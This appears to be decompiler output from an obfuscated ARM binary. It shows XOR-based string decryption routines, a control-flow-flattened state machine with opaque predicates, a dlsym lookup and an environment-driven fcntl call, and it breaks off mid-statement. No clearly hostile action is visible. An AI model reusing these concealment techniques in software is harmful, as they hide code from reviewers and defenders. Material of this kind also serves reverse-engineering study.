    *(byte *)(iVar4 + 0x27d3d) = bVar1 ^ 0xf4;
    *(byte *)(iVar4 + 0x27d3e) = bVar2 ^ 0x11;
    *(byte *)(iVar4 + 0x27d3f) = bVar3 ^ 0x7d;
    *(byte *)(iVar4 + 0x27d40) = *(byte *)(iVar6 + 0x27d64) ^ 0x52;
    *(byte *)(iVar4 + 0x27d41) = *(byte *)(iVar6 + 0x27d65) ^ 0xa2;
    bVar1 = *(byte *)(iVar6 + 0x27d67);
    *(byte *)(iVar4 + 0x27d42) = *(byte *)(iVar6 + 0x27d66) ^ 0xef;
    *(byte *)(iVar4 + 0x27d43) = bVar1 ^ 0x8b;
  }
  DataMemoryBarrier(0xb);
  *piVar5 = 1;
  local_8 = param_3;
  local_4 = param_4;
  iVar6 = FUN_00027e2c();
  dprintf(iVar6,(char *)(DAT_00027e24 + 0x27de4));
  vdprintf(iVar6,param_2,&local_8);
  dprintf(iVar6,(char *)(DAT_00027e28 + 0x27e08));
                    /* WARNING: Subroutine does not return */
  _exit(param_1);
}



// ---- 00027e2c  FUN_00027e2c  size=560

void FUN_00027e2c(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  int iVar4;
  byte bVar5;
  int *piVar6;
  byte *pbVar7;
  byte *pbVar8;
  long __fd;
  byte *unaff_r7;
  byte *local_30 [2];
  undefined4 uStack_28;
  int local_24;
  
  iVar4 = DAT_00028074;
  iVar3 = DAT_00028070;
  local_24 = **(int **)(DAT_00028068 + 0x27e40);
  piVar6 = (int *)(DAT_0002806c + 0x27e54);
  DataMemoryBarrier(0xb);
  if (*piVar6 == 0) {
    bVar5 = *(byte *)(DAT_00028074 + 0x27e75);
    bVar1 = *(byte *)(DAT_00028074 + 0x27e76);
    *(byte *)(DAT_00028070 + 0x27e70) = *(byte *)(DAT_00028074 + 0x27e74) ^ 0x34;
    bVar2 = *(byte *)(iVar4 + 0x27e77);
    *(byte *)(iVar3 + 0x27e71) = bVar5 ^ 0x66;
    *(byte *)(iVar3 + 0x27e72) = bVar1 ^ 0x8d;
    *(byte *)(iVar3 + 0x27e73) = bVar2 ^ 0x29;
    bVar5 = *(byte *)(iVar4 + 0x27e7f);
    unaff_r7 = (byte *)(uint)bVar5;
    *(byte *)(iVar3 + 0x27e74) = *(byte *)(iVar4 + 0x27e78) ^ 0x2c;
    bVar1 = *(byte *)(iVar4 + 0x27e80);
    *(byte *)(iVar3 + 0x27e75) = *(byte *)(iVar4 + 0x27e79) ^ 0x47;
    bVar2 = *(byte *)(iVar4 + 0x27e81);
    *(byte *)(iVar3 + 0x27e76) = *(byte *)(iVar4 + 0x27e7a) ^ 0x4c;
    *(byte *)(iVar3 + 0x27e77) = *(byte *)(iVar4 + 0x27e7b) ^ 0x45;
    *(byte *)(iVar3 + 0x27e78) = *(byte *)(iVar4 + 0x27e7c) ^ 0x83;
    *(byte *)(iVar3 + 0x27e79) = *(byte *)(iVar4 + 0x27e7d) ^ 0xa4;
    *(byte *)(iVar3 + 0x27e7a) = *(byte *)(iVar4 + 0x27e7e) ^ 0x73;
    *(byte *)(iVar3 + 0x27e7b) = bVar5 ^ 0x5b;
    *(byte *)(iVar3 + 0x27e7c) = bVar1 ^ 5;
    *(byte *)(iVar3 + 0x27e7d) = bVar2 ^ 0x2e;
    *(byte *)(iVar3 + 0x27e7e) = *(byte *)(iVar4 + 0x27e82) ^ 0xa2;
    *(byte *)(iVar3 + 0x27e7f) = *(byte *)(iVar4 + 0x27e83) ^ 0x38;
    *(byte *)(iVar3 + 0x27e80) = *(byte *)(iVar4 + 0x27e84) ^ 0x26;
    *(byte *)(iVar3 + 0x27e81) = *(byte *)(iVar4 + 0x27e85) ^ 0x1c;
    *(byte *)(iVar3 + 0x27e82) = *(byte *)(iVar4 + 0x27e86) ^ 0xae;
    bVar5 = *(byte *)(iVar4 + 0x27e88);
    *(byte *)(iVar3 + 0x27e83) = *(byte *)(iVar4 + 0x27e87) ^ 0xe6;
    *(byte *)(iVar3 + 0x27e84) = bVar5 ^ 0x37;
  }
  DataMemoryBarrier(0xb);
  *piVar6 = 1;
  uStack_28 = param_3;
  pbVar7 = (byte *)getenv((char *)(DAT_00028078 + 0x27f8c));
  pbVar8 = pbVar7;
  if (pbVar7 != (byte *)0x0) {
    pbVar8 = (byte *)(uint)*pbVar7;
    unaff_r7 = pbVar7;
  }
  if (pbVar7 != (byte *)0x0 && pbVar8 != (byte *)0x0) {
    piVar6 = (int *)__errno();
    *piVar6 = 0;
    __fd = strtol((char *)unaff_r7,(char **)local_30,(DAT_0002805c | 10) ^ DAT_0002805c);
    if ((*piVar6 == 0) && (local_30[0] != unaff_r7)) {
      bVar5 = *local_30[0];
      if (bVar5 != 0) {
        bVar5 = 1;
      }
      if (bVar5 == 0 && -1 < __fd) {
        fcntl(__fd,(DAT_00028060 | 1) ^ DAT_00028060);
      }
    }
  }
  if (**(int **)(DAT_0002807c + 0x27fb4) != local_24) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(local_24);
  }
  return;
}



// ---- 00028080  FUN_00028080  size=17236

uint FUN_00028080(void)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  uint uVar11;
  int iVar12;
  int iVar13;
  int **ppiVar14;
  int iVar15;
  uint uVar16;
  int iVar17;
  undefined4 uVar18;
  int iVar19;
  int iVar20;
  int *piVar21;
  uint uVar22;
  int iVar23;
  uint uVar24;
  int *piVar25;
  int iVar26;
  uint uVar27;
  int iVar28;
  int iVar29;
  char *pcVar30;
  int iVar31;
  int **ppiVar32;
  byte *pbVar33;
  bool bVar34;
  int *local_180 [2];
  int local_178 [2];
  uint local_170 [2];
  int local_168 [2];
  uint local_160 [2];
  int local_158 [2];
  char local_150 [8];
  char local_148 [8];
  int local_140 [2];
  byte local_138 [8];
  int local_130 [2];
  byte local_128 [8];
  int local_120 [2];
  char local_118 [8];
  int local_110 [2];
  char local_108 [8];
  int local_100 [2];
  int local_f8 [2];
  int local_f0 [2];
  uint local_e8 [2];
  byte local_e0 [8];
  char local_d8 [8];
  uint local_d0 [2];
  byte local_c8 [8];
  byte local_c0 [8];
  char local_b8 [8];
  int local_b0 [3];
  uint local_a4;
  uint local_a0;
  uint local_9c;
  int *local_98;
  uint *local_94;
  uint local_90;
  byte *local_8c;
  int *local_88;
  byte *local_84;
  int *local_80;
  char *local_7c;
  uint *local_78;
  byte *local_74;
  byte *local_70;
  char *local_6c;
  int *local_68;
  char *local_64;
  char *local_60;
  int *local_5c;
  int *local_58;
  char *local_54;
  int *local_50;
  char *local_4c;
  int *local_48;
  uint *local_44;
  byte *local_40;
  int **local_3c;
  int *local_38;
  uint *local_34;
  int *local_30;
  int *local_2c;
  
  local_98 = local_b0;
  local_6c = local_b8;
  local_70 = local_c0;
  local_40 = local_c8;
  local_44 = local_d0;
  local_4c = local_d8;
  local_74 = local_e0;
  local_78 = local_e8;
  local_30 = local_f0;
  local_5c = local_f8;
  local_50 = local_100;
  local_7c = local_108;
  local_38 = local_110;
  local_54 = local_118;
  local_80 = local_120;
  local_84 = local_128;
  local_88 = local_130;
  local_8c = local_138;
  local_58 = local_140;
  local_60 = local_148;
  local_64 = local_150;
  local_48 = local_158;
  local_34 = local_160;
  local_68 = local_168;
  local_94 = local_170;
  DataMemoryBarrier(0xb);
  local_b0[0] = *(int *)(DAT_000291ac + 0x281c8);
  local_178[0] = DAT_000291b0;
  local_9c = DAT_000291b4 ^ DAT_000291b8;
  local_180[0] = local_178;
  local_a0 = DAT_000291bc ^ DAT_000291c0;
  local_3c = local_180;
  local_a4 = DAT_000291d0 ^ DAT_000291d4;
  local_2c = local_178;
  piVar25 = local_178;
  iVar23 = DAT_000291c8;
  iVar26 = DAT_000291b0;
  iVar29 = DAT_000291cc;
  iVar19 = DAT_000291c4;
  ppiVar32 = local_180;
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while (piVar21 = local_2c, ppiVar14 = local_3c, iVar13 = DAT_0002cf2c,
                iVar12 = DAT_0002cf28, uVar11 = DAT_0002ce5c, iVar10 = DAT_0002cdd0,
                iVar9 = DAT_0002c418, iVar8 = DAT_0002c414, iVar7 = DAT_0002ba2c,
                iVar31 = DAT_0002b98c, iVar6 = DAT_0002ad80, iVar28 = DAT_0002ad7c,
                uVar27 = DAT_0002a1e4, uVar22 = DAT_0002a144, iVar20 = DAT_00029d8c,
                uVar16 = DAT_00029c48, iVar17 = DAT_000291c4, iVar15 = *piVar25, iVar15 == iVar19) {
            **ppiVar32 = DAT_000296d4;
          }
          if (iVar15 != DAT_00029248) break;
          **ppiVar32 = DAT_000296c8;
          *local_60 = *local_58 == 0;
        }
        if (iVar15 == DAT_0002924c) {
          uVar16 = (*(uint *)(DAT_0002cf98 + 0x2c10c) ^ DAT_0002ce3c) *
                   (*(uint *)(DAT_0002cf94 + 0x2c0fc) ^ DAT_0002ce38);
          uVar16 = (uVar16 - (DAT_0002cdcc + 2 ^ DAT_0002cdcc) * (uVar16 & DAT_0002ce40)) +
                   DAT_0002ce44;
          iVar17 = DAT_0002cdd4;
          if (DAT_0002ce50 <
              uVar16 + (DAT_0002cdc0 + 1 ^ DAT_0002cdc0) + (~uVar16 | DAT_0002ce48) + DAT_0002ce4c)
          {
            iVar17 = -0x344a782;
          }
          goto LAB_0002cd74;
        }
        if (iVar15 != DAT_00029260) break;
        **ppiVar32 = DAT_0002ce04;
      }
      if (iVar15 != DAT_00029264) break;
      uVar16 = (*(uint *)(DAT_00029a64 + 0x28ac8) ^ DAT_00029a60) *
               (*(uint *)(DAT_00029a58 + 0x28abc) ^ DAT_00029a5c);
      iVar17 = DAT_0002969c;
      if (((uVar16 & DAT_00029a68) - (DAT_00029a6c & ~uVar16) & DAT_00029a70) + DAT_00029a74 <
          DAT_00029a78) {
        iVar17 = 0x5485c349;
      }
LAB_0002cd74:
      **ppiVar32 = iVar17;
    }
    if (iVar15 == DAT_00029278) {
      iVar17 = DAT_0002945c;
      if ((*(uint *)(DAT_0002a108 + 0x29110) ^ *(uint *)(DAT_0002a09c + 0x29108) ^ DAT_0002a10c |
          DAT_0002a110) * DAT_0002a0a0 + DAT_0002a114 < DAT_0002a118) {
        iVar17 = -0x30205fb9;
      }
      goto LAB_0002cd74;
    }
    if (iVar15 == DAT_0002927c) {
      **ppiVar32 = DAT_00029260;
    }
    else {
      uVar24 = local_9c;
      if (iVar15 == DAT_00029280) goto LAB_0002cd10;
      if (iVar15 == DAT_00029284) {
        pbVar33 = (byte *)(DAT_0002c414 + 0x2ba5c);
        bVar1 = *(byte *)(DAT_0002c414 + 0x2ba5e);
        pcVar30 = (char *)(DAT_0002c418 + 0x2ba70);
        bVar2 = *(byte *)(DAT_0002c414 + 0x2ba5d);
        *(byte *)(DAT_0002c418 + 0x2ba74) = *(byte *)(DAT_0002c414 + 0x2ba60) ^ 0x52;
        bVar3 = *(byte *)(iVar8 + 0x2ba61);
        *(byte *)(iVar9 + 0x2ba72) = ~bVar1 & 0x11 | bVar1 & 0xee;
        *(byte *)(iVar9 + 0x2ba75) = bVar3 ^ 0xa2;
        bVar1 = *(byte *)(iVar8 + 0x2ba5f);
        *(byte *)(iVar9 + 0x2ba77) = *(byte *)(iVar8 + 0x2ba63) ^ 0x8b;
        bVar3 = *(byte *)(iVar8 + 0x2ba67);
        *(byte *)(iVar9 + 0x2ba78) = *(byte *)(iVar8 + 0x2ba64) ^ 0x2e;
        bVar4 = *(byte *)(iVar8 + 0x2ba68);
        *pcVar30 = *pbVar33 + (*pbVar33 & 0x59) * -2 + 'Y';
        *(byte *)(iVar9 + 0x2ba71) = bVar2 + (bVar2 & 0x74) * -2 + -0xc;
        bVar2 = *(byte *)(iVar8 + 0x2ba69);
        *(byte *)(iVar9 + 0x2ba73) = bVar1 + (bVar1 & 0x7d) * -2 + '}';
        *(byte *)(iVar9 + 0x2ba76) =
             *(byte *)(iVar8 + 0x2ba62) + (*(byte *)(iVar8 + 0x2ba62) & 0x6f) * -2 + -0x11;
        *(byte *)(iVar9 + 0x2ba79) = *(byte *)(iVar8 + 0x2ba65) ^ 0x2c;
        *(byte *)(iVar9 + 0x2ba7a) = *(byte *)(iVar8 + 0x2ba66) ^ 0x34;
        *(byte *)(iVar9 + 0x2ba7d) = bVar2 ^ 0x29;
        iVar23 = DAT_0002cb1c;
        iVar19 = DAT_0002cb18;
        bVar1 = *(byte *)(DAT_0002cb18 + 0x2bb2d);
        bVar2 = *(byte *)(DAT_0002cb18 + 0x2bb2e);
        bVar5 = *(byte *)(DAT_0002cb18 + 0x2bb2f);
        *(byte *)(DAT_0002cb1c + 0x2bb48) = *(byte *)(DAT_0002cb18 + 0x2bb2c) ^ 0x2c;
        *(byte *)(iVar23 + 0x2bb49) = bVar1 ^ 0x47;
        *(byte *)(iVar23 + 0x2bb4c) = *(byte *)(iVar19 + 0x2bb30) ^ 0x83;
        *(byte *)(iVar9 + 0x2ba7c) = ~bVar4 & 0x8d | bVar4 & 0x72;
        bVar1 = *(byte *)(iVar19 + 0x2bb33);
        *(byte *)(iVar9 + 0x2ba7b) = (~bVar3 | 0x99) & (bVar3 | 0x66);
        iVar26 = DAT_0002ad8c;
        *(byte *)(iVar23 + 0x2bb4a) = bVar2 + (bVar2 & 0x4c) * -2 + 'L';
        bVar2 = *(byte *)(iVar19 + 0x2bb34);
        bVar3 = *(byte *)(iVar19 + 0x2bb32);
        *(byte *)(iVar23 + 0x2bb4b) = (~bVar5 & 0xf6 | bVar5 & 9) ^ 0xb3;
        *(byte *)(iVar23 + 0x2bb4d) = *(byte *)(iVar19 + 0x2bb31) ^ 0xa4;
        *(byte *)(iVar23 + 0x2bb4e) = bVar3 ^ 0x73;
        *(byte *)(iVar23 + 0x2bb4f) = bVar1 ^ 0x5b;
        *(byte *)(iVar23 + 0x2bb52) = *(byte *)(iVar19 + 0x2bb36) ^ 0xa2;
        *(byte *)(iVar23 + 0x2bb53) = *(byte *)(iVar19 + 0x2bb37) ^ 0x38;
        *(byte *)(iVar23 + 0x2bb54) = *(byte *)(iVar19 + 0x2bb38) ^ 0x26;
        *(byte *)(iVar23 + 0x2bb51) =
             ~*(byte *)(iVar19 + 0x2bb35) & 0x2e | *(byte *)(iVar19 + 0x2bb35) & 0xd1;
        iVar17 = DAT_0002cc18;
        *(byte *)(iVar23 + 0x2bb50) = (~bVar2 & 0x3c | bVar2 & 0xc3) ^ 0x39;
        *(byte *)(iVar23 + 0x2bb55) =
             *(byte *)(iVar19 + 0x2bb39) + (*(byte *)(iVar19 + 0x2bb39) & 0x1c) * -2 + '\x1c';
        *(byte *)(iVar23 + 0x2bb56) = *(byte *)(iVar19 + 0x2bb3a) ^ 0xae;
        *(byte *)(iVar23 + 0x2bb57) = *(byte *)(iVar19 + 0x2bb3b) ^ 0xe6;
        *(byte *)(iVar23 + 0x2bb58) =
             *(byte *)(iVar19 + 0x2bb3c) + (*(byte *)(iVar19 + 0x2bb3c) & 0x37) * -2 + '7';
        *(byte *)(iVar23 + 0x2bb59) = *(byte *)(iVar19 + 0x2bb3d) ^ 4;
        iVar23 = DAT_0002cc44;
        iVar19 = DAT_0002cc40;
        *(byte *)(DAT_0002cc44 + 0x2bca4) = *(byte *)(DAT_0002cc40 + 0x2bc94) ^ 0xae;
        *(byte *)(iVar23 + 0x2bca5) = *(byte *)(iVar19 + 0x2bc95) ^ 0x53;
        *(byte *)(iVar23 + 0x2bca6) =
             *(byte *)(iVar19 + 0x2bc96) + (*(byte *)(iVar19 + 0x2bc96) & 0x2c) * -2 + -0x54;
        *(byte *)(iVar23 + 0x2bca7) =
             *(byte *)(iVar19 + 0x2bc97) + (*(byte *)(iVar19 + 0x2bc97) & 6) * -2 + '\x06';
        *(byte *)(iVar23 + 0x2bca8) = *(byte *)(iVar19 + 0x2bc98) ^ 0x7a;
        *(byte *)(iVar23 + 0x2bca9) = *(byte *)(iVar19 + 0x2bc99) ^ 0x67;
        *(byte *)(iVar23 + 0x2bcaa) = *(byte *)(iVar19 + 0x2bc9a) ^ 0xc9;
        *(byte *)(iVar23 + 0x2bcab) = *(byte *)(iVar19 + 0x2bc9b) ^ 0xa6;
        *(byte *)(iVar23 + 0x2bcac) =
             (~*(byte *)(iVar19 + 0x2bc9c) | 0xe5) & (*(byte *)(iVar19 + 0x2bc9c) | 0x1a);
        *(byte *)(iVar23 + 0x2bcad) =
             *(byte *)(iVar19 + 0x2bc9d) + (*(byte *)(iVar19 + 0x2bc9d) & 0x23) * -2 + '#';
        *(byte *)(iVar23 + 0x2bcae) =
             *(byte *)(iVar19 + 0x2bc9e) + (*(byte *)(iVar19 + 0x2bc9e) & 0x5c) * -2 + -0x24;
        *(byte *)(iVar23 + 0x2bcaf) = *(byte *)(iVar19 + 0x2bc9f) ^ 0x6b;
        *(byte *)(iVar23 + 0x2bcb0) = *(byte *)(iVar19 + 0x2bca0) ^ 0x2a;
        *(byte *)(iVar23 + 0x2bcb1) =
             *(byte *)(iVar19 + 0x2bca1) + (*(byte *)(iVar19 + 0x2bca1) & 0x5a) * -2 + -0x26;
        *(byte *)(iVar23 + 0x2bcb2) =
             *(byte *)(iVar19 + 0x2bca2) + (*(byte *)(iVar19 + 0x2bca2) & 0x44) * -2 + 'D';
        *(byte *)(iVar23 + 0x2bcb3) =
             *(byte *)(iVar19 + 0x2bca3) + (*(byte *)(iVar19 + 0x2bca3) & 0x20) * -2 + -0x60;
        *(byte *)(iVar23 + 0x2bcb4) = *(byte *)(iVar19 + 0x2bca4) ^ 0x3e;
        *(byte *)(iVar23 + 0x2bcb5) =
             (~*(byte *)(iVar19 + 0x2bca5) & 0xbf | *(byte *)(iVar19 + 0x2bca5) & 0x40) ^ 0xb0;
        *(byte *)(iVar23 + 0x2bcb6) = *(byte *)(iVar19 + 0x2bca6) ^ 0xf;
        *(byte *)(iVar23 + 0x2bcb7) =
             ~*(byte *)(iVar19 + 0x2bca7) & 100 | *(byte *)(iVar19 + 0x2bca7) & 0x9b;
        iVar23 = DAT_0002cda4;
        iVar19 = DAT_0002cda0;
        *(byte *)(DAT_0002cda4 + 0x2be04) =
             *(byte *)(DAT_0002cda0 + 0x2bdf4) + (*(byte *)(DAT_0002cda0 + 0x2bdf4) & 0x16) * -2 +
             '\x16';
        *(byte *)(iVar23 + 0x2be05) = *(byte *)(iVar19 + 0x2bdf5) ^ 0x97;
        *(byte *)(iVar23 + 0x2be06) = *(byte *)(iVar19 + 0x2bdf6) ^ 0xbe;
        *(byte *)(iVar23 + 0x2be07) = *(byte *)(iVar19 + 0x2bdf7) ^ 0xd4;
        *(byte *)(iVar23 + 0x2be08) = *(byte *)(iVar19 + 0x2bdf8) ^ 0x96;
        *(byte *)(iVar23 + 0x2be09) = *(byte *)(iVar19 + 0x2bdf9) ^ 0xbc;
        *(byte *)(iVar23 + 0x2be0a) = *(byte *)(iVar19 + 0x2bdfa) ^ 0xf0;
        *(byte *)(iVar23 + 0x2be0b) =
             ~*(byte *)(iVar19 + 0x2bdfb) & 0x9b | *(byte *)(iVar19 + 0x2bdfb) & 100;
        *(byte *)(iVar23 + 0x2be0c) = *(byte *)(iVar19 + 0x2bdfc) ^ 0x46;
        *(byte *)(iVar23 + 0x2be0d) =
             (~*(byte *)(iVar19 + 0x2bdfd) & 0x24 | *(byte *)(iVar19 + 0x2bdfd) & 0xdb) ^ 0xcb;
        *(byte *)(iVar23 + 0x2be0e) = *(byte *)(iVar19 + 0x2bdfe) ^ 0xa0;
        *(byte *)(iVar23 + 0x2be0f) =
             *(byte *)(iVar19 + 0x2bdff) + (*(byte *)(iVar19 + 0x2bdff) & 0x66) * -2 + -0x1a;
        *(byte *)(iVar23 + 0x2be10) =
             *(byte *)(iVar19 + 0x2be00) + (*(byte *)(iVar19 + 0x2be00) & 0x6e) * -2 + 'n';
        *(byte *)(iVar23 + 0x2be11) = *(byte *)(iVar19 + 0x2be01) ^ 0xec;
        *(byte *)(iVar23 + 0x2be12) = *(byte *)(iVar19 + 0x2be02) ^ 0xcb;
        *(byte *)(iVar23 + 0x2be13) =
             ~*(byte *)(iVar19 + 0x2be03) & 0x81 | *(byte *)(iVar19 + 0x2be03) & 0x7e;
        *(byte *)(iVar23 + 0x2be14) =
             ~((*(byte *)(iVar19 + 0x2be04) | 0xb5) & (~*(byte *)(iVar19 + 0x2be04) | 0x4a));
        *(byte *)(iVar23 + 0x2be15) =
             *(byte *)(iVar19 + 0x2be05) + (*(byte *)(iVar19 + 0x2be05) & 0x34) * -2 + '4';
        *(byte *)(iVar23 + 0x2be16) = *(byte *)(iVar19 + 0x2be06) ^ 0x95;
        *(byte *)(iVar23 + 0x2be17) =
             *(byte *)(iVar19 + 0x2be07) + (*(byte *)(iVar19 + 0x2be07) & 0x79) * -2 + 'y';
        *(byte *)(iVar23 + 0x2be18) =
             *(byte *)(iVar19 + 0x2be08) + (*(byte *)(iVar19 + 0x2be08) & 7) * -2 + '\a';
        iVar23 = DAT_0002cdac;
        iVar19 = DAT_0002cda8;
        *(byte *)(DAT_0002cdac + 0x2bf84) =
             (~*(byte *)(DAT_0002cda8 + 0x2bf6c) & 0x58 | *(byte *)(DAT_0002cda8 + 0x2bf6c) & 0xa7)
             ^ 0x39;
        *(byte *)(iVar23 + 0x2bf85) = *(byte *)(iVar19 + 0x2bf6d) ^ 6;
        *(byte *)(iVar23 + 0x2bf86) = *(byte *)(iVar19 + 0x2bf6e) ^ 0xd3;
        *(byte *)(iVar23 + 0x2bf87) = *(byte *)(iVar19 + 0x2bf6f) ^ 0x1e;
        *(byte *)(iVar23 + 0x2bf88) = *(byte *)(iVar19 + 0x2bf70) ^ 0xe4;
        *(byte *)(iVar23 + 0x2bf89) =
             (~*(byte *)(iVar19 + 0x2bf71) & 0x44 | *(byte *)(iVar19 + 0x2bf71) & 0xbb) ^ 0x27;
        *(byte *)(iVar23 + 0x2bf8a) =
             ~((*(byte *)(iVar19 + 0x2bf72) | 0xba) & (~*(byte *)(iVar19 + 0x2bf72) | 0x45));
        *(byte *)(iVar23 + 0x2bf8b) =
             (~*(byte *)(iVar19 + 0x2bf73) | 10) & (*(byte *)(iVar19 + 0x2bf73) | 0xf5);
        iVar23 = DAT_0002cfa0;
        iVar19 = DAT_0002cf9c;
        *(byte *)(DAT_0002cfa0 + 0x2c024) = *(byte *)(DAT_0002cf9c + 0x2c014) ^ 0x13;
        *(byte *)(iVar23 + 0x2c025) = *(byte *)(iVar19 + 0x2c015) ^ 0x49;
        *(byte *)(iVar23 + 0x2c026) = *(byte *)(iVar19 + 0x2c016) ^ 0x87;
        *(byte *)(iVar23 + 0x2c027) = *(byte *)(iVar19 + 0x2c017) ^ 0xbb;
        **local_3c = iVar17;
        piVar25 = piVar21;
        iVar23 = DAT_0002ce0c;
        iVar19 = iVar31;
        ppiVar32 = ppiVar14;
      }
      else if (iVar15 == DAT_00029288) {
        *(int *)(DAT_000298bc + 0x288e8) = *local_30;
        **ppiVar32 = DAT_00029674;
      }
      else if (iVar15 == DAT_0002928c) {
        **ppiVar32 = DAT_0002ce1c;
      }
      else if (iVar15 == DAT_00029290) {
        **ppiVar32 = DAT_0002cdfc;
      }
      else if (iVar15 == DAT_00029294) {
        iVar17 = dlsym(*(undefined4 *)(DAT_00029a7c + 0x28b14),DAT_00029a80 + 0x28b1c);
        *(int *)(DAT_00029b1c + 0x28b30) = iVar17;
        *local_5c = iVar17;
        **ppiVar32 = DAT_000296c4;
      }
      else {
        if (iVar15 == DAT_000292dc) {
          uVar22 = *(uint *)(DAT_00029818 + 0x28830) ^ DAT_00029810;
          uVar16 = *(uint *)(DAT_0002980c + 0x28824) ^ DAT_00029820;
          iVar17 = DAT_00029458;
          iVar23 = DAT_000291c8;
          if ((((uVar16 | uVar22) * (uVar16 & uVar22) +
                (uVar16 & (*(uint *)(DAT_00029818 + 0x28830) ^ DAT_00029814)) *
                (uVar22 & (*(uint *)(DAT_0002980c + 0x28824) ^ DAT_0002981c)) & DAT_00029824) -
              (DAT_000291d0 + 0x3a000 ^ DAT_00029828)) + DAT_0002982c < DAT_00029830) {
            iVar17 = -0x6b5089a0;
          }
          goto LAB_0002cd74;
        }
        if (iVar15 == DAT_000292e0) {
          **ppiVar32 = DAT_00029560;
        }
        else {
          if (iVar15 == DAT_000292e4) {
            iVar20 = FUN_00035060(((*(uint *)(DAT_0002cf6c + 0x2cd44) ^ DAT_0002ce8c) *
                                   (*(uint *)(DAT_0002cf68 + 0x2cd38) ^ DAT_0002ce88) | DAT_0002ce90
                                  ) + DAT_0002ce94,DAT_0002ce98);
            iVar17 = DAT_0002ce2c;
            if (iVar20 == DAT_0002ce9c) {
              iVar17 = -0x34f97d44;
            }
            goto LAB_0002cd74;
          }
          if (iVar15 == DAT_000292e8) {
            *(undefined4 *)(DAT_0002cf70 + 0x2c080) = *(undefined4 *)(DAT_0002cf74 + 0x2c07c);
            **ppiVar32 = DAT_0002cdf4;
          }
          else {
            if (iVar15 == DAT_000292ec) {
              iVar17 = DAT_0002930c;
              if (*local_6c != '\0') {
                iVar17 = -0x33b2fe13;
              }
              goto LAB_0002cd74;
            }
            if (iVar15 == DAT_000292f0) {
              iVar17 = DAT_0002ba24;
              if (DAT_0002ba20 <
                  (((*(uint *)(DAT_0002ba10 + 0x2abec) ^ DAT_0002ba0c) -
                   (*(uint *)(DAT_0002ba04 + 0x2abe0) ^ DAT_0002ba08)) * DAT_0002ba14 + DAT_0002ba18
                  ^ DAT_0002ba1c)) {
                iVar17 = 0x7194bbce;
              }
              goto LAB_0002cd74;
            }
            if (iVar15 == DAT_000292f4) {
              **ppiVar32 = DAT_00029294;
            }
            else if (iVar15 == DAT_000292f8) {
              *(byte *)(DAT_0002ba2c + 0x2adb9) = *local_40 ^ 0x6a;
              iVar26 = DAT_0002ba30;
              bVar1 = *(byte *)(DAT_0002ba30 + 0x2adc7);
              *(byte *)(iVar7 + 0x2adbc) = *(byte *)(DAT_0002ba30 + 0x2adc8) ^ 0x56;
              bVar2 = *(byte *)(iVar26 + 0x2adc9);
              *(byte *)(iVar7 + 0x2adbb) = ~bVar1 & 100 | bVar1 & 0x9b;
              bVar1 = *(byte *)(iVar26 + 0x2adc6);
              *(byte *)(iVar7 + 0x2adbd) = ~bVar2 & 0x44 | bVar2 & 0xbb;
              *(byte *)(iVar7 + 0x2adba) = (~bVar1 | 0xc6) & (bVar1 | 0x39);
              *(byte *)(iVar7 + 0x2adbe) =
                   ~(*(byte *)(iVar26 + 0x2adca) & 0xe5 | ~*(byte *)(iVar26 + 0x2adca) & 0x1a);
              *(byte *)(iVar7 + 0x2adbf) =
                   (~*(byte *)(iVar26 + 0x2adcb) & 0x5b | *(byte *)(iVar26 + 0x2adcb) & 0xa4) ^ 0xd1
              ;
              *(byte *)(iVar7 + 0x2adc0) =
                   *(byte *)(iVar26 + 0x2adcc) + (*(byte *)(iVar26 + 0x2adcc) & 0x25) * -2 + -0x5b;
              uVar22 = *(uint *)(DAT_0002ba34 + 0x2ae60);
              uVar27 = *(uint *)(DAT_0002ba38 + 0x2ae68);
              bVar1 = *(byte *)(iVar26 + 0x2adce);
              *(byte *)(iVar7 + 0x2adc1) = *(byte *)(iVar26 + 0x2adcd) ^ 0xa4;
              *(byte *)(iVar7 + 0x2adc2) = bVar1 ^ 0x36;
              iVar23 = DAT_0002ba40;
              iVar19 = DAT_0002ba3c;
              bVar1 = *(byte *)(iVar26 + 0x2adcf);
              bVar2 = *(byte *)(iVar26 + 0x2add0);
              bVar3 = *(byte *)(DAT_0002ba3c + 0x2ae91);
              *(byte *)(DAT_0002ba40 + 0x2aea4) = *(byte *)(DAT_0002ba3c + 0x2ae90) ^ 0xd9;
              *(byte *)(iVar7 + 0x2adc3) = ~bVar1 & 2 | bVar1 & 0xfd;
              *(byte *)(iVar7 + 0x2adc4) = bVar2 + (bVar2 & 0x51) * -2 + 'Q';
              *(byte *)(iVar7 + 0x2adc5) =
                   *(byte *)(iVar26 + 0x2add1) + (*(byte *)(iVar26 + 0x2add1) & 0x79) * -2 + 'y';
              *(byte *)(iVar7 + 0x2adc6) =
                   ~(*(byte *)(iVar26 + 0x2add2) & 0x3a | ~*(byte *)(iVar26 + 0x2add2) & 0xc5);
              *(byte *)(iVar7 + 0x2adc7) =
                   ~(*(byte *)(iVar26 + 0x2add3) & 0x5a | ~*(byte *)(iVar26 + 0x2add3) & 0xa5);
              bVar1 = *(byte *)(iVar19 + 0x2ae94);
              bVar2 = *(byte *)(iVar19 + 0x2ae95);
              *(byte *)(iVar7 + 0x2adc8) =
                   ~(*(byte *)(iVar26 + 0x2add4) & 0x9d | ~*(byte *)(iVar26 + 0x2add4) & 0x62);
              *(byte *)(iVar23 + 0x2aea8) = ~bVar1 & 0x7b | bVar1 & 0x84;
              *(byte *)(iVar23 + 0x2aea9) = ~bVar2 & 0x82 | bVar2 & 0x7d;
              *(byte *)(iVar23 + 0x2aeaa) =
                   ~*(byte *)(iVar19 + 0x2ae96) & 0x67 | *(byte *)(iVar19 + 0x2ae96) & 0x98;
              bVar1 = *(byte *)(iVar19 + 0x2ae92);
              *(byte *)(iVar23 + 0x2aeab) =
                   ~*(byte *)(iVar19 + 0x2ae97) & 0x61 | *(byte *)(iVar19 + 0x2ae97) & 0x9e;
              *(byte *)(iVar23 + 0x2aea5) = ~bVar3 & 0x1a | bVar3 & 0xe5;
              iVar17 = DAT_0002ba44;
              bVar2 = *(byte *)(iVar19 + 0x2ae93);
              *(byte *)(iVar23 + 0x2aea6) = bVar1 + (bVar1 & 0x65) * -2 + 'e';
              *(byte *)(iVar23 + 0x2aeac) =
